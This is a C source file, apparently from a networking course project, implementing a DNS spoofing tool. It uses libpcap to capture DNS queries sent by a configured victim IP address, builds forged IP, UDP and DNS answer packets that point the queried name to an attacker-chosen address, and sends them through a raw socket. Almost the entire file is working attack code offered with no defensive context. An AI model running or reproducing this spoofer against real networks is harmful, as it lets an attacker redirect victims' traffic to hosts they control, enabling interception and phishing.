/*-----------------------------------------------------------------------------
 * SOURCE FILE:     dns
 *
 * PROGRAM:         main
 *
 * FUNCTIONS:       void dns_sniff(struct config *c);
 *                  void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet);
 *                  void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my_ip *spoof_ip);
 *                  void handle_UDP(const u_char *packet, struct udp_header *spoof_udp);
 *                  void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof);
 *                  unsigned short in_cksum(unsigned short *ptr, int nbytes);
 *                  void send_dns_answer(char *ip, u_short port, u_char *packet, int packlen);
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * NOTES:
 * This file contains the dns spoofing and sending functions
 * --------------------------------------------------------------------------*/
#include "dns.h"

/*--------------------------------------------------------------------------
 * FUNCTION:        dns_sniff
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       struct config *c - cofiguration data
 *
 * RETURNS:         void
 *
 * NOTES:
 * This function filters for specified ip and dns packets
 * -----------------------------------------------------------------------*/
void dns_sniff(struct config *c)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *nic_descr;
    struct bpf_program fp;
    bpf_u_int32 maskp;
    bpf_u_int32 netp;
    int filter_len = 28;

    char filter_exp[filter_len + strlen(getIPString(c->victimIP))];

    snprintf(filter_exp, filter_len + strlen(getIPString(c->victimIP)), "ip src %s and udp dst port 53", getIPString(c->victimIP));

    printf("PCAP Filter: %s\n", filter_exp);

    pcap_lookupnet(c->interfaceName, &netp, &maskp, errbuf);

    nic_descr = pcap_open_live(c->interfaceName, BUFSIZ, 1, -1, errbuf);
    if (nic_descr == NULL)
    {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(1);
    }

    if (pcap_compile(nic_descr, &fp, filter_exp, 0, netp) == -1)
    {
        fprintf(stderr, "Error calling pcap_compile\n");
        exit(1);
    }

    if (pcap_setfilter(nic_descr, &fp) == -1)
    {
        fprintf(stderr, "Error setting filter\n");
        exit(1);
    }

    // Start the capture session

    if (pcap_loop(nic_descr, 0, handle_packet, (u_char *)c) == -1)
    {
        fprintf(stderr, "pcap_loop err\n");
        fprintf(stdout, "%s\n", pcap_geterr(nic_descr));

        exit(1);
    }
}

/*--------------------------------------------------------------------------
 * FUNCTION:        handle_packet
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       u_char *args - cofiguration data
 *                  const struct pcap_pkthdr *pkthdr - packet header
 *                  const u_char *packet - received packet
 *
 * RETURNS:         void
 *
 * NOTES:
 * This function handles the packets received
 * -----------------------------------------------------------------------*/
void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    u_char *spoof_packet;
    struct my_ip *spoof_ip;
    struct udp_header *spoof_udp;
    u_char *dns_spoof;
    int packet_len = 0;
    int dns_len = 0;
    struct config *c = (struct config *)args;

    packet_len = sizeof(struct my_ip) + sizeof(struct udp_header) +
                 sizeof(struct dns_header) + sizeof(struct dns_answer) - 4 +
                 sizeof(struct dns_query) + c->targetLen;
    ;

    spoof_packet = (u_char *)malloc(packet_len);
    dns_len = sizeof(struct dns_header) + sizeof(struct dns_answer) + sizeof(struct dns_query) + c->targetLen - 4;

    spoof_ip = (struct my_ip *)malloc(sizeof(struct my_ip));
    spoof_udp = (struct udp_header *)malloc(sizeof(struct udp_header));
    dns_spoof = (u_char *)malloc(dns_len);

    handle_IP(pkthdr, packet, spoof_ip);
    handle_UDP(packet, spoof_udp);
    handle_DNS(c, packet, dns_spoof);

    memcpy(spoof_packet, spoof_ip, sizeof(struct my_ip));
    memcpy(spoof_packet + sizeof(struct my_ip), spoof_udp, sizeof(struct udp_header));
    memcpy(spoof_packet + sizeof(struct my_ip) + sizeof(struct udp_header), dns_spoof, dns_len);

    send_dns_answer(inet_ntoa(spoof_ip->ip_dst), spoof_udp->dport, spoof_packet, packet_len);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        handle_IP
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       const struct pcap_pkthdr *pkthdr - packet header
 *                  const u_char *packet - received packet
 *                  struct my_ip *spoof_ip - structure to spoofed IP header
 * 
 * RETURNS:         void
 *
 * NOTES:
 * This function builds the spoofed ip header
 * -----------------------------------------------------------------------*/
void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my_ip *spoof_ip)
{
    const struct my_ip *ip;
    u_int length = pkthdr->len;
    u_int hlen, version;
    int len;

    // Jump past the Ethernet header
    ip = (struct my_ip *)(packet + sizeof(struct ether_header));
    length -= sizeof(struct ether_header);

    // make sure that the packet is of a valid length
    if (length < sizeof(struct my_ip))
    {
        printf("Truncated IP %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);

    // Spoof IP
    memcpy(spoof_ip, ip, sizeof(struct my_ip));
    memcpy(&spoof_ip->ip_dst, &ip->ip_src, IP_LEN);
    memcpy(&spoof_ip->ip_src, &ip->ip_dst, IP_LEN);
    spoof_ip->ip_tos = 0;
    spoof_ip->ip_id = 0;
    spoof_ip->ip_len += 16;
    spoof_ip->ip_sum = in_cksum((u_short *)spoof_ip, sizeof(struct my_ip));

    // verify version
    if (version != 4)
    {
        fprintf(stdout, "Unknown version %d\n", version);
        exit(1);
    }

    // verify the header length */
    if (hlen < 5)
    {
        fprintf(stdout, "Bad header length %d \n", hlen);
    }
    // Ensure that we have as much of the packet as we should
    if (length < len)
        printf("\nTruncated IP - %d bytes missing\n", len - length);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        handle_UDP
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       const u_char *packet - received packet
 *                  struct udp_header *spoof_udp - structure to spoofed udp header
 *
 * RETURNS:         void
 *
 * NOTES:
 * This function builds the spoofed udp header
 * -----------------------------------------------------------------------*/
void handle_UDP(const u_char *packet, struct udp_header *spoof_udp)
{
    const struct udp_header *udp = 0; // The UDP header
    const struct my_ip *ip;           // The IP header
    int size_ip;

    ip = (struct my_ip *)(packet + ETH_HEADER_LENGTH);
    size_ip = IP_HL(ip) * 4;

    // define/compute tcp header offset
    udp = (struct udp_header *)(packet + ETH_HEADER_LENGTH + size_ip);

    memcpy(spoof_udp, udp, sizeof(struct udp_header));
    spoof_udp->dport = udp->sport;
    spoof_udp->sport = udp->dport;
    spoof_udp->len = htons(ntohs(udp->len) + 16);
    spoof_udp->sum = 0;
}

/*--------------------------------------------------------------------------
 * FUNCTION:        handle_DNS
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       struct config *c - configuration data
 *                  const u_char *packet - received packet
 *                  u_char *dns_spoof - structure to spoofed DNS header
 *
 * RETURNS:         void
 *
 * NOTES:
 * This function  builds the spoofed dns headerr
 * -----------------------------------------------------------------------*/
void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
{
    struct dns_header *dns_header;
    struct dns_answer *dns_answer;
    struct dns_query *dns_query;

    int frontLen = ETH_HEADER_LENGTH + sizeof(struct my_ip) + sizeof(struct udp_header);
    dns_header = (struct dns_header *)(packet + frontLen);
    dns_query = (struct dns_query *)(packet + frontLen + sizeof(struct dns_header) + c->targetLen);
    // dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);
    dns_answer = (struct dns_answer *)malloc(sizeof(struct dns_answer));

    dns_header->flags = htons(0x8180);
    dns_header->ancount = htons(1);
    dns_answer->name = htons(0xc00c);
    dns_answer->type = htons(1);
    dns_answer->class = htons(1);
    dns_answer->ttl = htonl(0x00012c56);
    dns_answer->len = htons(4);
    memcpy(&dns_answer->addr, c->spoofIP, IP_LEN);

    // Fill dns spoof
    memcpy(dns_spoof, dns_header, sizeof(struct dns_header));
    memcpy(dns_spoof + sizeof(struct dns_header), packet + frontLen + sizeof(struct dns_header), c->targetLen);
    memcpy(dns_spoof + sizeof(struct dns_header) + c->targetLen, dns_query, sizeof(struct dns_query));

    int ahead = sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen;
    memcpy(dns_spoof + ahead, &dns_answer->name, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->type, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->class, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->ttl, 4);
    memcpy(dns_spoof + (ahead += 4), &dns_answer->len, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->addr, 4);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        in_cksum
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       unsigned short *ptr, int nbytes
 *
 * RETURNS:         void
 *
 * NOTES:
 * This function makes the checksum
 * -----------------------------------------------------------------------*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        send_dns_answer
 *
 * DATE:            November 10, 2021
 *
 * REVISIONS:       N/A
 *
 * DESIGNER:        Nicole Jingco
 *
 * PROGRAMMER:      Nicole Jingco
 *
 * INTERFACE:       char *ip - destination ip
 *                  u_short port - destination port
 *                  u_char *packet - spoofed packet
 *                  int packlen - length of spoofed packer
 *
 * RETURNS:         void
 *
 * NOTES:
 * This function send the data
 * -----------------------------------------------------------------------*/
void send_dns_answer(char *ip, u_short port, u_char *packet, int packlen)
{
    struct sockaddr_in to_addr;
    int bytes_sent;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    const int *val = &one;

    if (sock < 0)
    {
        fprintf(stderr, "Error creating socket");
        return;
    }
    to_addr.sin_family = AF_INET;
    to_addr.sin_port = port;
    to_addr.sin_addr.s_addr = inet_addr(ip);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error at setsockopt()");
        return;
    }

    bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
    if (bytes_sent < 0)
        fprintf(stderr, "Error sending dat\n");
}